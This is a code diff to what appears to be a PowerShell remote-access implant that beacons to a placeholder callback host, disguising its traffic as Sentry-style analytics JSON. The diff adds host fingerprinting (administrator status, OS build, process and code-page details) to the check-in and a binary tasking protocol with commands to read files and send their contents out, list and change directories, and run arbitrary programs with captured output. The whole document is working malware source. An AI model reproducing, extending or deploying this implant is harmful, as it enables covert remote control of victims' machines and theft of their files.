@@ -10,11 +10,39 @@ $hexStringBeat = [System.BitConverter]::ToString($beat) -replace '-'
 
 $uri = "http://<CALLBACK_HOST>:<CALLBACK_PORT>/api/" + $randomId + "/envelope"
 
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($identity)
+$elevated = $principal.IsInRole(
+    [Security.Principal.WindowsBuiltInRole]::Administrator
+)
+
+$isServer = $OS.ProductType -ne 1
+
+$gmtOffset = [TimeZoneInfo]::Local.GetUtcOffset(
+    [DateTime]::Now
+).TotalMinutes
+
+$flag = 0
+$flag = ($flag -shl 1) -bor ([int]$IsServer)
+$flag = ($flag -shl 1) -bor ([int]$elevated)
+$flag = ($flag -shl 1) -bor ([int][Environment]::Is64BitOperatingSystem)
+$flag = ($flag -shl 1) -bor ([int][Environment]::Is64BitProcess)
+
 $initialData = @{
-    domain      = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
-    username    = "$env:USERDOMAIN\$env:USERNAME"
-    computer    = $env:COMPUTERNAME
-    internal_ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+    domain          = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
+    username        = "$env:USERDOMAIN\$env:USERNAME"
+    computer        = $env:COMPUTERNAME
+    internal_ip     = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+    pid             = $pid
+    tid             = [System.AppDomain]::GetCurrentThreadId()
+    flag            = $flag
+    build_number    = [Environment]::OSVersion.Version.Build
+    major_version   = [Environment]::OSVersion.Version.Major
+    minor_version   = [Environment]::OSVersion.Version.Minor
+    process_name    = (Get-Process -Id $PID).ProcessName
+    gmt_offset      = $gmtOffset
+    acp             = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.ANSICodePage
+    oemcp           = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.OEMCodePage
 } | convertto-json
 
 $global:isInitial = $true
@@ -38,22 +66,52 @@ function SendData($result) {
 {"contexts":{"trace":{"trace_id":"trace123456789abc","span_id":"span123456789abc","op":"pageload"}},"spans":[{"span_id":"span987654321def","op":"http.client","description":"' + $hexStringData + '","start_timestamp":1704067200.000,"timestamp":1704067200.100,"trace_id":"trace123456789abc"}],"start_timestamp":1704067200.000,"timestamp":1704067201.000,"transaction":"/home","type":"transaction","platform":"javascript"}
 '
 
-    $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body
+    $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body -UseBasicParsing
 
     $encodedTaskData = ($response.Content | convertfrom-json).id
     if ($encodedTaskData -eq "") {
         return New-Object System.Collections.ArrayList
     }
 
-    $hexBytes = $encodedTaskData -split '(..)' | Where-Object { -not [String]::IsNullOrEmpty($_) }
+    $offset = 0
 
-    foreach ($hexByte in $hexBytes) {
-        # Convert each hex pair to an integer (base 16) and then to a character
-        $asciiString += [char]([convert]::ToInt32($hexByte, 16))
+    $hexBytes = for ($i = 0; $i -lt $encodedTaskData.Length; $i += 2) {
+        [Convert]::ToByte($encodedTaskData.Substring($i, 2), 16)
     }
 
-    $taskData = $asciiString | ConvertFrom-Json
-    return $taskData
+    $res1 = [BitConverter]::ToUint32($hexBytes, $offset)
+    $offset += 4
+
+    $cmd = [BitConverter]::ToUint32($hexBytes, $offset)
+    $offset += 4
+
+    $arg = [System.Collections.ArrayList]::new()
+
+    while ($offset -lt $hexBytes.Length - 4) {
+
+        $argLen = [BitConverter]::ToUint32($hexBytes, $offset)
+        $offset += 4
+
+        $argString = [Text.Encoding]::ASCII.GetString(
+            $hexBytes,
+            $offset,
+            $argLen - 1 # Skip the NULL terminator
+        )
+
+        [void]$arg.Add($argString)
+        $offset += $argLen
+
+    }
+
+    $tid = [BitConverter]::ToUint32($hexBytes, $offset)
+
+    return [PSCustomObject]@{
+        Reserved1   = $res1
+        Reserved2   = $res2
+        TaskId      = $tid
+        Command     = $cmd
+        Arguments   = $arg
+    }
 }
 
 
@@ -63,87 +121,87 @@ while ($true) {
     $TaskData = SendData($TaskResults)
     $TaskResults.Clear()
 
-    foreach ($task in $TaskData) {
-        $taskId = $task.task_id
-        # Decode task data
-        $jsonData = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task.task_data))
-        $data = ConvertFrom-Json $jsonData
+    $taskId = $TaskData.TaskId
 
-        if ($data.command -eq "cat") {
-            $path = $data.path
+    if ($TaskData.Command -eq 24) { #Cat
+        $path = $TaskData.Arguments[0]
+
+        try {
             $result = [System.IO.File]::ReadAllBytes($path)
-            
-            $responseData = @{
-                command = $data.command
-                path = $data.path
-                content = $result
-                taskId = $taskId
-            }
-            $TaskResults.Add($responseData)
-        } elseif ($data.command -eq "cd") {
-            $path = $data.path
-            Set-Location -Path $path -ErrorAction Stop
-            [Environment]::CurrentDirectory = (Get-Location -PSProvider FileSystem).ProviderPath # For .NET
-            $currentLocation = Get-Location
-            $responseData = @{
-                command = $data.command
-                path = $path
-                new_path = $currentLocation.Path
-                taskId = $taskId
-            }
-            $TaskResults.Add($responseData)
-        } elseif ($data.command -eq "ls") {
-            $path = if ($data.path) { $data.path } else { Get-Location } # If no path is sent, ls current dir
-            $path = $path.Path
-            $items = Get-ChildItem -Path $path -ErrorAction Stop
-            $fileList = @()
-            foreach ($item in $items) {
-                $fileList += [PSCustomObject]@{
-                    Name = $item.Name
-                    FullName = $item.FullName
-                    IsDirectory = $item.PSIsContainer
-                    Length = if ($item.PSIsContainer) { $null } else { $item.Length }
-                    LastWriteTime = $item.LastWriteTime
-                }
-            }
-            $responseData = @{
-                command = $data.command
-                path = $path
-                files = $fileList
-                taskId = $taskId
-            }
-            $TaskResults.Add($responseData)
-        } elseif ($data.command -eq "run") {
-            $executable = $data.executable
-            $args = if ($data.args) { $data.args } else { "" }
-            
-            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-            $processInfo.FileName = $executable
-            $processInfo.Arguments = $args
-            $processInfo.RedirectStandardOutput = $true
-            $processInfo.RedirectStandardError = $true
-            $processInfo.UseShellExecute = $false
-            $processInfo.CreateNoWindow = $true
-            
-            $process = New-Object System.Diagnostics.Process
-            $process.StartInfo = $processInfo
-            $process.Start() | Out-Null
-            
-            $stdout = $process.StandardOutput.ReadToEnd()
-            $stderr = $process.StandardError.ReadToEnd()
-            $process.WaitForExit()
-            
-            $responseData = @{
-                command = $data.command
-                executable = $executable
-                args = $args
-                stdout = $stdout
-                stderr = $stderr
-                exitCode = $process.ExitCode
-                taskId = $taskId
-            }
-            $TaskResults.Add($responseData)
+        } catch {
+            $result = $null
         }
+        
+        $responseData = @{
+            command = $TaskData.Command
+            path = $path
+            content = $result
+            taskId = $taskId
+        }
+        $TaskResults.Add($responseData)
+    }
+    elseif ($TaskData.Command -eq 8) {          # Cd
+        $path = $TaskData.Arguments[0]
+        Set-Location -Path $path -ErrorAction Stop
+        [Environment]::CurrentDirectory = (Get-Location -PSProvider FileSystem).ProviderPath # For .NET
+        $currentLocation = Get-Location
+        $responseData = @{
+            command = $TaskData.Command
+            path = $path
+            new_path = $currentLocation.Path
+            taskId = $taskId
+        }
+        $TaskResults.Add($responseData)
+    } elseif ($TaskData.Command -eq 14) {       # Ls
+        $path = $TaskData.Arguments[0]
+        $items = Get-ChildItem -Path $path -ErrorAction Stop
+        $fileList = @()
+        foreach ($item in $items) {
+            $fileList += [PSCustomObject]@{
+                Name = $item.Name
+                FullName = $item.FullName
+                IsDirectory = $item.PSIsContainer
+                Length = if ($item.PSIsContainer) { $null } else { $item.Length }
+                LastWriteTime = $item.LastWriteTime
+            }
+        }
+        $responseData = @{
+            command = $TaskData.Command
+            path = $path
+            files = $fileList
+            taskId = $taskId
+        }
+        $TaskResults.Add($responseData)
+    } elseif ($TaskData.Command -eq 6) {        # Run
+        $executable = $TaskData.Arguments[0]
+        $args = if ($TaskData.Arguments[1]) { $TaskData.Arguments[1] } else { "" }
+        
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = $executable
+        $processInfo.Arguments = $args
+        $processInfo.RedirectStandardOutput = $true
+        $processInfo.RedirectStandardError = $true
+        $processInfo.UseShellExecute = $false
+        $processInfo.CreateNoWindow = $true
+        
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo = $processInfo
+        $process.Start() | Out-Null
+        
+        $stdout = $process.StandardOutput.ReadToEnd()
+        $stderr = $process.StandardError.ReadToEnd()
+        $process.WaitForExit()
+        
+        $responseData = @{
+            command = $TaskData.Command
+            executable = $executable
+            args = $args
+            stdout = $stdout
+            stderr = $stderr
+            exitCode = $process.ExitCode
+            taskId = $taskId
+        }
+        $TaskResults.Add($responseData)
     }
 
     Start-Sleep 10
